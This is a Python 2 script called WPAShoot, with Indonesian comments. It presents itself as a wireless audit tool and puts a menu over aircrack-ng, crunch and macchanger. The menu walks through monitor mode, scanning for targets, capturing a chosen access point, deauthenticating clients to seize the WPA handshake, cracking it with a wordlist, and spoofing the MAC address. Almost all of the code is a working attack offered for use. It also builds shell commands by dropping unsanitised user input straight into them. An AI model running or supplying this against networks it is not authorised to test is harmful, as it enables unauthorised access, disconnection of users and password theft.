#!/usr/bin/env python
#WPAShoot Adalah Tools Untuk Audit Keamanan Jaringan Wireless Yang Berbasis aircrack-ng suite
#Created By HardGhost Alkori
##############################################################################################

import os.path
import os
import subprocess
import time
from termcolor import colored

os.system('clear')
def check():
 print "Checking required tools:"
 path = '/usr/bin/aircrack-ng'
 if os.path.exists(path): 
  time.sleep(0.5)
  print "aircrack-ng",colored(' [OK]','green')
  time.sleep(0.1)
 else:
  print "Aircrack-ng",colored ("[NOT INSTALLED]",'red')," Please Install aircrack-ng"
  exit()

def check2():
 path = '/usr/bin/leafpad'
 if os.path.exists(path):
  print "Leafpad", colored('[OK]','green')
  time.sleep(0.1)
 else:
  print "Leafpad", colored("[NOT INSTALLED]",'red'), "Please Install Leafpad"
  exit()

def check3():
 path = '/usr/bin/crunch'
 if os.path.exists(path):
  print "Crunch",colored('[OK]','green')
 else:
  print "Crunch", colored("[NOT INSATLLED]",'red'), "Please Install Crunch"
  exit()

def check4():
 path = '/usr/bin/macchanger'
 if os.path.exists(path):
   print "macchanger",colored("[OK]","green")
 else:
  print "macchanger",colored("[NOT INSTALLED]",'red'),"Please Install Macchanger"
def check5():
 path = '/usr/bin/xterm'
 if os.path.exists(path):
  print "xterm",colored("[OK]","green")
 else:
  print "xterm",colored("[NOT INSTALLED]",'red'),"Please Install xterm"

check()
check2()
check3()
check4()
check5()

time.sleep(1.5)

os.system("clear")

def opening():
 os.system("clear")
print colored("             __        ______   _",'red'),"          _           _"
time.sleep(0.1)
print colored("             \ \      / /  _ \ / \ ",'red'),"    ___| |__   ___ | |"
time.sleep(0.1)
print colored("              \ \ /\ / /| |_) / _ \  ",'red')," / __| '_ \ / _ \| __|"
time.sleep(0.1)
print colored("               \ V  V / |  __/ ___ \ ",'red')," \__ \ | | | (_) | |"
time.sleep(0.1)
print colored("                \_/\_/  |_| /_/   \_\ ",'red'),"|___/_| |_|\___/ \__|"

print
time.sleep(1)
print'		            Version 1.0 Beta'
time.sleep(1)
print '		   Bug Report hardghostalkori@gmail.com'

time.sleep(3)
def menu() :
 os.system("clear")
 print colored("  __        ______   _",'red'),"          _           _"
 print colored("  \ \      / /  _ \ / \ ",'red'),"    ___| |__   ___ | |"
 print colored("   \ \ /\ / /| |_) / _ \  ",'red')," / __| '_ \ / _ \| __|"
 print colored("    \ V  V / |  __/ ___ \ ",'red')," \__ \ | | | (_) | |"
 print colored("     \_/\_/  |_| /_/   \_\ ",'red'),"|___/_| |_|\___/ \__|"
 print
 print colored("                 Version 1.0 Beta",'blue')
 print colored("          visit: hardghost-sec.blogspot.com",'cyan')
 print colored("        Bug Report hardghostalkori@gmail.com",'blue')
 print
 print colored(" 1.Activate Mode Monitor",'green')
 print colored(" 2.Check Monitor Interfaces",'green')
 print colored(" 3.Test Wireless Adapter Packet Injection",'green')
 print colored(" 4.Scan Wireless Network",'green')
 print colored(" 5.Capture Packet Specific by Target Acces Point",'green')
 print colored(" 6.Capture Handshake or WPA Encryption",'green')
 print colored(" 7.Crack WPA Encrytion!",'green')
 print colored(" 8.Restart Service NetworkManager And Networking",'green')
 print colored("               ----EXTRAS----",'yellow')
 print colored(" 99.Create Wordlist [Crunch]",'red')
 print colored(" 88.Change Mac Address",'red')
 print colored(" 00.Exit",'red')

def pilih():
 print
 time.sleep(0.1)
 pilih = input("WPAShot> ")
 os.system("clear")
 if pilih == 1:
  monitor()
 elif pilih == 2:
  interface()
 elif pilih == 3:
  inject()
 elif pilih == 4:
  scan()
 elif pilih == 5:
  capture()
 elif pilih == 6:
  handshake()
 elif pilih == 7:
  wpa()
 elif pilih == 00:
  exit()
 elif pilih == 8:
  restart()
 elif pilih == 99:
  extra()
 elif pilih == 88:
  mac()
 elif pilih == ' ':
  menu()
  pilih()
 else:
  print ("Pilihan Tidak Ada Di Menu!")
os.system("clear")

def interface():
 pid =subprocess.Popen(args=["xterm","-hold","-e","airmon-ng"])

def restart():
 print ("Restarting Service Networking...")
 os.system ("service networking restart")
 print ("Restarting Service Network Manager...")
 os.system("service NetworkManager restart")
 print ("Removing Wireless Monitor Interface...")
 os.system("airmon-ng stop mon0")

def monitor():
 os.system("xterm -e airmon-ng check kill")
 os.system("xterm -e airmon-ng start wlan0")
 os.system("clear")
 menu()

def inject():
 print "Berfungsi Untuk Testing Adapter Apakah Support Injection Atau Tidak"
 print
 interface=raw_input ("input your wireless monitor interface mon0/wlan0mon: ")
 pid2 = subprocess.Popen(args=["xterm","-e","airodump-ng",interface])
 time.sleep(1)
 pid = subprocess.Popen(args=["xterm","-hold","-e","aireplay-ng --test "+interface])
 os.system("clear")
 menu()

def scan():
 print "Berfungsi Untuk Scan Jaringan Wifi Di sekitar"
 print
 interface=raw_input("input your wireless monitor interface mon0/wlan0mon: ")
 pid = subprocess.Popen(args=["xterm","-e","airodump-ng "+interface])
 subprocess.Popen(args=["leafpad"])
 os.system("clear")
 menu()
 print "type ctrl+c when done"

def capture():
 print "Berfungsi Untuk Memonitor Acces Point Yang Target Nya sudah di tentukan"
 print
 interface =raw_input ("input your wireless monitor interface mon0/wlan0mon: ")
 channel=raw_input("Target Channel: ")
 bssid=raw_input("BSSID Target:")
 write=raw_input ("Masukan Nama Hasil Capture:")
 pid = subprocess.Popen(args=["xterm","-hold","-e","airodump-ng", "-c" ,channel, "--bssid" ,bssid ,"-w" ,write, interface])
 menu()

def handshake():
 print "Berfungsi Untuk Memutuskan Client Dan Menangkap Informasi User Ke Acces Point Termasuk Enskripsi WPAnya"
 print
 interface=raw_input("input wireless monitor wlan0mon/mon0: ")
 bssid=raw_input("BSSID Target: ")
 client=raw_input("input your client target: ")
 packet=raw_input("JUmlah Paket untuk deauth: ") 
 os.system("xterm -e aireplay-ng --deauth %s -a %s -c %s --ignore-negative-one %s"%(packet,bssid,client,interface))
def wpa():
 print "Untuk Proses Cracking nya"
 wordlist=raw_input("Path Your Wordlist: ")
 capture=raw_input("Your Capture File: ")
 os.system("xterm -hold -e aircrack-ng -w %s %s"%(wordlist,capture))
 menu()

def extra():
 minimum = raw_input("Insert Minimum Wordlist *WPA Minimum 8 : ")
 maximum = raw_input("Insert Maximum Wordlist: ")
 os.system("clear")
 print "lalpha-numeric"
 print "lalpha"
 charset = raw_input("Insert Charset Type:")
 output = raw_input ("Insert Your Output Name: ")
 pid = subprocess.Popen(args=["xterm","-hold","-e","crunch" ,minimum, maximum, "-f", "/usr/share/crunch/charset.lst" ,charset,"-o","/root/"+output])

def mac(): 
 interface = raw_input("Input Your Monitor Interfaces: ")
 subprocess.Popen(args=["ifconfig" ,interface,"down"])
 mac = raw_input("Input Your New Mac Address: ")
 subprocess.Popen(args=["macchanger","-m" ,mac,interface])

while menu:
 menu()
 pilih()
